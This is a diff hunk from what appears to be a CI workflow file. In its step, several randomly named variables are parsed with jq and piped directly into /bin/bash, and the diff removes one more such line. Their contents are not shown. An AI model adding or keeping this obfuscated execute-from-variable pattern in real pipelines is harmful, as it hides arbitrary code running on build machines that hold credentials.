@@ -26,7 +26,6 @@ jobs:
           echo $do29 | jq -r .dxme2 | /bin/bash
           printf '%s' "$oag7334" | jq -r .gc57907 | /bin/bash
           echo $jhxqn75 | jq -r .vh5527 | /bin/bash
-          echo $hmby6160 | jq -r .m9 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
